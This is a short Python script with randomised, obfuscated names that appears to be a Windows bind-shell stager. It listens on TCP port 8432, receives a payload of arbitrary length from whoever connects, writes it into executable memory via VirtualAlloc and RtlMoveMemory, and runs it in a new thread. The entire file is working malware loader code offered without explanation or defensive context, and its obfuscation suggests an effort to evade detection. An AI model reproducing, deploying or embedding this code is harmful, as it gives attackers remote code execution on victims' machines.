import struct, socket, binascii, ctypes, random, time
huHzmxgUjIRPBi, cjdmbXROEad = None, None
def EPIjXtNCQZIfZ():
	try:
		global cjdmbXROEad
		global sDoecwdsxA
		cjdmbXROEad = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		cjdmbXROEad.bind(('0.0.0.0', 8432))
		cjdmbXROEad.listen(1)
		sDoecwdsxA,_ = cjdmbXROEad.accept()
		KmAQLw = struct.pack('<i', sDoecwdsxA.fileno())
		l = struct.unpack('<i', sDoecwdsxA.recv(4))[0]
		yVJInRq = b"     "
		while len(yVJInRq) < l: yVJInRq += sDoecwdsxA.recv(l)
		aEixCyTaEYbv = ctypes.create_string_buffer(yVJInRq, len(yVJInRq))
		aEixCyTaEYbv[0] = binascii.unhexlify('BF')
		for i in range(4): aEixCyTaEYbv[i+1] = KmAQLw[i]
		return aEixCyTaEYbv
	except: return None
def YQZfxrHpVJOuQ(KTBSdTusqqxDWCx):
	if KTBSdTusqqxDWCx != None:
		GthahELWFc = bytearray(KTBSdTusqqxDWCx)
		YKuDITKsZdePy = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(GthahELWFc)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(YKuDITKsZdePy), ctypes.c_int(len(GthahELWFc)))
		FwqESPBLAmG = (ctypes.c_char * len(GthahELWFc)).from_buffer(GthahELWFc)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(YKuDITKsZdePy), FwqESPBLAmG, ctypes.c_int(len(GthahELWFc)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(YKuDITKsZdePy),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
huHzmxgUjIRPBi = EPIjXtNCQZIfZ()
YQZfxrHpVJOuQ(huHzmxgUjIRPBi)